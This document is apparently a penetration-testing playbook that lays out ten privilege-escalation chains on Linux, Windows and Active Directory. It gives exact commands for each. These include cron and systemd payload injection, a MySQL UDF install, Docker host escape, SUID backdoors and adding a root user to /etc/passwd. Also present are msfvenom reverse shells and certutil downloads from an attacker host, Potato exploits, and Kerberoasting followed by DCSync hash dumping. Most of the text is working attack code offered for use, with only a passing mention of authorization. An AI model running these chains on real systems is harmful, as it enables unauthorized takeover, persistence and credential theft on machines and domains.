# Privilege Escalation Chains — Multi-Step Real-World Paths

Each chain documents exact commands, decision points, and fallback options.

---

## Linux Chains

### Chain 1: www-data → Writable Cron Job → Root

**Starting point:** Shell as www-data from web exploit

```bash
# Step 1: Enumerate cron jobs
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null
# Look for scripts run by root with world-writable or group-writable permissions

# Step 2: Check permissions on cron scripts
find /etc/cron* -type f -exec ls -la {} \; 2>/dev/null
# Found: * * * * * root /opt/scripts/cleanup.sh
ls -la /opt/scripts/cleanup.sh
# -rwxrwxr-x 1 root www-data 245 Jan 15 /opt/scripts/cleanup.sh
# www-data can write!

# Step 3: Inject payload
echo '' >> /opt/scripts/cleanup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /opt/scripts/cleanup.sh

# Step 4: Wait for cron (monitor with pspy if timing unknown)
./pspy64 -pf -i 1000
# Watch for: CMD: UID=0 | /bin/bash /opt/scripts/cleanup.sh

# Step 5: Execute SUID shell
/tmp/rootbash -p
id
# uid=33(www-data) gid=33(www-data) euid=0(root)

# IF CRON SCRIPT NOT WRITABLE — try these:
# a) Check if script uses relative paths → PATH hijack
strings /opt/scripts/cleanup.sh | head -20
# b) Check if script uses wildcards → wildcard injection
grep '\*' /opt/scripts/cleanup.sh
# c) Monitor with pspy for hidden cron jobs not in /etc/crontab
```

### Chain 2: www-data → MySQL as Root → UDF → Root

**Starting point:** Shell as www-data, discovered MySQL credentials in web app config

```bash
# Step 1: Find MySQL credentials
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/.env 2>/dev/null
cat /var/www/html/config/database.php 2>/dev/null
grep -rn "password" /var/www/ --include="*.php" --include="*.conf" --include="*.env" 2>/dev/null | head -20
# Found: DB_PASSWORD='dbr00tpass'

# Step 2: Check MySQL running user
ps aux | grep mysql
# mysql runs as root? Check:
mysql -u root -p'dbr00tpass' -e "SELECT @@version; SELECT user();"
# Confirm: user()=root@localhost AND process owner is root

# Step 3: Check UDF prerequisites
mysql -u root -p'dbr00tpass' -e "SHOW VARIABLES LIKE 'plugin_dir';"
# /usr/lib/mysql/plugin/
mysql -u root -p'dbr00tpass' -e "SHOW VARIABLES LIKE 'secure_file_priv';"
# Empty or NULL = good. If set to a path, UDF still works via hex insert.

# Step 4: Upload UDF (pre-compiled .so from sqlmap or compile your own)
# On Kali, locate the UDF:
locate lib_mysqludf_sys.so
# /usr/share/sqlmap/data/udf/linux/64/lib_mysqludf_sys.so_
# Note: sqlmap ships them XOR'd, decode first:
python3 /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/linux/64/lib_mysqludf_sys.so_

# Transfer to target /tmp/lib_mysqludf_sys.so

# Step 5: Install UDF via MySQL
mysql -u root -p'dbr00tpass' << 'SQL'
USE mysql;
CREATE TABLE IF NOT EXISTS pwn(line BLOB);
INSERT INTO pwn VALUES(LOAD_FILE('/tmp/lib_mysqludf_sys.so'));
SELECT * FROM pwn INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
DROP FUNCTION sys_exec;
DROP TABLE pwn;
SQL

# Step 6: Get root
/tmp/rootbash -p

# IF SECURE_FILE_PRIV BLOCKS LOAD_FILE:
# Insert the .so as hex directly:
# xxd -p /tmp/lib_mysqludf_sys.so | tr -d '\n' > /tmp/udf_hex.txt
# mysql: SELECT UNHEX('<hex_content>') INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';

# IF MYSQL NOT RUNNING AS ROOT:
# MySQL may still be useful — read files via LOAD_FILE(), write webshells, pivot
```

### Chain 3: Low-Priv User → Docker Group → Root

**Starting point:** Low-privilege user in the docker group

```bash
# Step 1: Confirm docker group membership
id
# uid=1001(user) gid=1001(user) groups=1001(user),999(docker)

# Step 2: Verify docker socket access
ls -la /var/run/docker.sock
docker ps

# Step 3: Mount host filesystem and chroot
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
# You are now root on the host filesystem

# Step 4: Establish persistence (optional, if authorized)
# Add SSH key:
echo "ssh-rsa AAAA... attacker@kali" >> /mnt/root/.ssh/authorized_keys
# Or add a new root user:
echo 'hacker:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash' >> /mnt/etc/passwd
# Or set SUID bash:
cp /mnt/bin/bash /mnt/tmp/rootbash
chmod +s /mnt/tmp/rootbash

# Step 5: Exit container, use persistence
exit
/tmp/rootbash -p

# IF NO IMAGES AVAILABLE (docker images returns empty):
# Pull an image (needs internet):
docker pull alpine
# Or load from tar:
docker load < saved_image.tar
# Or use docker build:
echo "FROM scratch" | docker build -t empty -
# Scratch won't work for chroot — you need a real image

# IF DOCKER CLI NOT INSTALLED (socket exists but no docker binary):
# Use curl:
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
# Create container via API (see container_escape.md for full curl workflow)
```

### Chain 4: Service Account → Writable systemd Timer → Root

**Starting point:** Shell as a service account (e.g., redis, postgres, tomcat)

```bash
# Step 1: Find writable systemd unit files
find /etc/systemd /usr/lib/systemd /run/systemd -writable -name "*.service" -o -writable -name "*.timer" 2>/dev/null
# Found: /etc/systemd/system/app-backup.service is writable

# Step 2: Check what triggers this service
systemctl list-timers --all | grep backup
# app-backup.timer triggers every hour

# Step 3: Read current service configuration
cat /etc/systemd/system/app-backup.service
# [Service]
# Type=oneshot
# ExecStart=/opt/app/backup.sh
# User=root

# Step 4: Modify ExecStart
cat > /etc/systemd/system/app-backup.service << 'EOF'
[Unit]
Description=Application Backup

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
User=root
EOF

# Step 5: Wait for timer to trigger (or try reload if allowed)
systemctl daemon-reload 2>/dev/null  # may fail without root
# If daemon-reload fails, service will still run with old in-memory config
# until next system boot or manual reload — but timer still triggers the service

# Actually: systemd reads the file on each activation for Type=oneshot
# So the modified ExecStart WILL execute on next timer trigger

# Step 6: Wait and check
watch -n 10 'ls -la /tmp/rootbash 2>/dev/null'
/tmp/rootbash -p

# IF SERVICE FILES NOT WRITABLE:
# Check the scripts they reference:
ls -la /opt/app/backup.sh
# If the script is writable, modify it instead
```

### Chain 5: Unprivileged → Sudo NOPASSWD (less/vim/nano) → Root

**Starting point:** Standard user with specific sudo permissions

```bash
# Step 1: Check sudo permissions
sudo -l
# (root) NOPASSWD: /usr/bin/less /var/log/auth.log

# Step 2: Shell escape from less
sudo less /var/log/auth.log
# Type: !/bin/bash
# Root shell obtained

# ALTERNATIVE — if less is restricted or doesn't work:
# The file argument restriction doesn't prevent shell escapes
# less allows: !command, v (opens $VISUAL/$EDITOR)

# If sudo allows vim:
# (root) NOPASSWD: /usr/bin/vim /etc/hosts
sudo vim /etc/hosts
# Type: :!/bin/bash
# Or: :set shell=/bin/bash | :shell
# Or: :py3 import os; os.system("/bin/bash")

# If sudo allows nano:
# (root) NOPASSWD: /usr/bin/nano
sudo nano
# Ctrl+R → Ctrl+X → type: reset; bash 1>&0 2>&0

# If sudo allows man:
# (root) NOPASSWD: /usr/bin/man
sudo man man
# Type: !/bin/bash

# IF SHELL ESCAPES ARE BLOCKED (e.g., rvim, restricted mode):
# Check if the sudo entry allows env vars:
sudo -l
# If env_keep includes EDITOR, VISUAL, PAGER:
PAGER='/bin/bash' sudo less /var/log/auth.log
EDITOR='/bin/bash' sudo vim /etc/hosts
```

### Chain 6: Unprivileged → NFS no_root_squash → Root

**Starting point:** Low-privilege user on NFS client, NFS share with no_root_squash

```bash
# Step 1: Discover NFS shares
showmount -e <target_ip>
# /srv/share *

cat /etc/exports  # on target if accessible
# /srv/share *(rw,sync,no_root_squash)

# Step 2: Mount on attacker (as root on Kali)
mkdir /tmp/nfs
mount -t nfs <target_ip>:/srv/share /tmp/nfs -o vers=3

# Step 3: Create SUID shell
cat > /tmp/nfs/shell.c << 'EOF'
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
EOF
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell -static
chmod u+s /tmp/nfs/shell
chown root:root /tmp/nfs/shell

# Step 4: On target as low-priv user
ls -la /srv/share/shell
# -rwsr-xr-x 1 root root ... /srv/share/shell
/srv/share/shell
id
# uid=0(root)

# IF MOUNT FAILS WITH NFSv4:
# Try: mount -t nfs <target>:/srv/share /tmp/nfs -o vers=3
# NFSv4 may use idmapping which can interfere with root squash settings

# IF NO GCC ON KALI (unlikely):
# Copy /bin/bash directly:
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash
# On target: /srv/share/rootbash -p
```

---

## Windows Chains

### Chain 7: IIS AppPool → SeImpersonatePrivilege → SYSTEM

**Starting point:** Webshell or reverse shell as IIS AppPool\DefaultAppPool

```powershell
# Step 1: Confirm privileges
whoami
# iis apppool\defaultapppool
whoami /priv
# SeImpersonatePrivilege    Enabled

# Step 2: Check Windows version for Potato selection
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
# Microsoft Windows Server 2019 Standard → PrintSpoofer or GodPotato

# Step 3: Upload and execute PrintSpoofer
certutil -urlcache -f http://10.10.14.5:8080/PrintSpoofer64.exe C:\Windows\Temp\PrintSpoofer64.exe
C:\Windows\Temp\PrintSpoofer64.exe -i -c cmd

# Step 4: Verify
whoami
# nt authority\system

# IF PRINTSPOOFER FAILS ("SpoolSS" error):
# Print Spooler may be disabled — try GodPotato instead:
certutil -urlcache -f http://10.10.14.5:8080/GodPotato-NET4.exe C:\Windows\Temp\gp.exe
C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"

# IF GODPOTATO ALSO FAILS:
# Try SweetPotato (combines multiple techniques):
C:\Windows\Temp\SweetPotato.exe -p cmd.exe -a "/c whoami"

# IF ALL POTATOES FAIL:
# Check for JuicyPotato on older systems
# Or pivot to service misconfiguration attacks
```

### Chain 8: Weak Service Permissions → SYSTEM

**Starting point:** Local user, discovered a service with weak DACL

```powershell
# Step 1: Enumerate modifiable services
.\accesschk64.exe /accepteula -uwcqv "Authenticated Users" * /svc
# SERVICE_NAME: VulnSvc
#   SERVICE_CHANGE_CONFIG

# Or with PowerUp:
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Get-ModifiableService"

# Step 2: Check current service config
sc qc VulnSvc
# BINARY_PATH_NAME   : C:\Program Files\VulnApp\service.exe
# START_TYPE         : AUTO_START
# SERVICE_START_NAME : LocalSystem

# Step 3: Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o rev.exe
# Upload to C:\Windows\Temp\rev.exe

# Step 4: Modify service binary path
sc config VulnSvc binpath= "C:\Windows\Temp\rev.exe"

# Step 5: Start listener and restart service
# On Kali: nc -lvnp 4444
sc stop VulnSvc
sc start VulnSvc
# Catch SYSTEM shell on listener

# IF SC CONFIG FAILS (access denied):
# Check if the service binary itself is writable:
icacls "C:\Program Files\VulnApp\service.exe"
# If (M) or (F) for your user:
move "C:\Program Files\VulnApp\service.exe" "C:\Program Files\VulnApp\service.exe.bak"
copy C:\Windows\Temp\rev.exe "C:\Program Files\VulnApp\service.exe"
sc stop VulnSvc && sc start VulnSvc

# IF SERVICE WON'T RESTART (requires reboot):
# Check if service auto-starts on boot and plan for reboot
# Or check for unquoted path in the same service
```

### Chain 9: AlwaysInstallElevated → SYSTEM

**Starting point:** Local user, discovered AlwaysInstallElevated is enabled

```powershell
# Step 1: Verify both registry keys
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# AlwaysInstallElevated    REG_DWORD    0x1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# AlwaysInstallElevated    REG_DWORD    0x1
# Both must be 1!

# Step 2: Generate malicious MSI
# On Kali:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o evil.msi

# Step 3: Transfer to target
certutil -urlcache -f http://10.10.14.5:8080/evil.msi C:\Windows\Temp\evil.msi

# Step 4: Start listener and install
# On Kali: nc -lvnp 4444
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
# Catch SYSTEM shell

# IF MSIEXEC BLOCKED BY APPLOCKER:
# Try: msiexec /quiet /qn /i \\10.10.14.5\share\evil.msi (UNC path)
# Or use PowerUp:
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Write-UserAddMSI"
# This creates UserAdd.msi that adds a local admin user
msiexec /quiet /qn /i UserAdd.msi
net localgroup administrators
```

### Chain 10: AD — Domain User → Kerberoast → DCSync → Domain Admin

**Starting point:** Compromised domain user account

```bash
# Step 1: Enumerate Kerberoastable SPNs
GetUserSPNs.py -dc-ip 10.10.10.100 corp.local/jsmith:'P@ssw0rd1' -request -outputfile tgs.txt

# Step 2: Identify high-value targets in output
cat tgs.txt
# Look for: svc-sql (MSSQLSvc/sql.corp.local:1433) — service accounts often have elevated privs
# Look for: svc-backup (member of Backup Operators or Server Operators)

# Step 3: Crack TGS hashes
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# Cracked: svc-sql:Summer2024!

# Step 4: Check what privileges svc-sql has
# Check group memberships
crackmapexec ldap 10.10.10.100 -u svc-sql -p 'Summer2024!' --groups
# Check if svc-sql has replication rights (DCSync)
# Or use BloodHound: Upload data, find shortest path to Domain Admin

# Step 5A: If svc-sql has DCSync rights directly:
secretsdump.py corp.local/svc-sql:'Summer2024!'@10.10.10.100
# Dump Administrator NTLM hash

# Step 5B: If svc-sql doesn't have DCSync but is local admin on DC or member of powerful group:
psexec.py corp.local/svc-sql:'Summer2024!'@10.10.10.100
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator

# Step 5C: If svc-sql has GenericAll on Domain Admins group:
net rpc group addmem "Domain Admins" "svc-sql" -U corp.local/svc-sql%'Summer2024!' -S 10.10.10.100

# Step 6: Use Domain Admin access
secretsdump.py corp.local/Administrator@10.10.10.100 -hashes :<ntlm_hash>
psexec.py corp.local/Administrator@10.10.10.100 -hashes :<ntlm_hash>
wmiexec.py corp.local/Administrator@10.10.10.100 -hashes :<ntlm_hash>

# IF KERBEROAST HASHES WON'T CRACK:
# Try AS-REP roasting for accounts without pre-auth:
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.10.10.100 -format hashcat
# Try ADCS abuse:
certipy find -u jsmith@corp.local -p 'P@ssw0rd1' -dc-ip 10.10.10.100 -vulnerable
# Try RBCD if GenericWrite found on computer objects (check BloodHound)
```

---

## Universal Decision Points

### "Which chain do I attempt first?"
```
1. Check sudo -l → immediate shell escape? (Chain 5) — fastest, quietest
2. Check cron jobs → writable scripts? (Chain 1) — quick, common
3. Check SUID/capabilities → unusual binaries? — see advanced_privesc.md
4. Check running services → MySQL/Postgres as root? (Chain 2)
5. Check groups → docker/lxd/disk? (Chain 3) — instant root
6. Check NFS → no_root_squash? (Chain 6) — requires attacker root
7. Check systemd → writable services/timers? (Chain 4)
8. Windows: check privileges → SeImpersonate? (Chain 7) — fast, reliable
9. Windows: check services → weak permissions? (Chain 8)
10. Windows: check AlwaysInstallElevated? (Chain 9) — rare but instant
11. AD: Kerberoast → crack → escalate (Chain 10) — requires patience
```

### Cleanup After Each Chain
```bash
# Linux: remove artifacts
rm -f /tmp/rootbash /tmp/suid /tmp/*.c /tmp/*.so
# Restore modified files (keep backups!)
# Remove added users from /etc/passwd

# Windows: restore services
sc config VulnSvc binpath= "C:\Program Files\VulnApp\service.exe"
# Remove uploaded binaries
del C:\Windows\Temp\PrintSpoofer64.exe C:\Windows\Temp\rev.exe C:\Windows\Temp\evil.msi
# Clean registry if UAC bypass was used
```
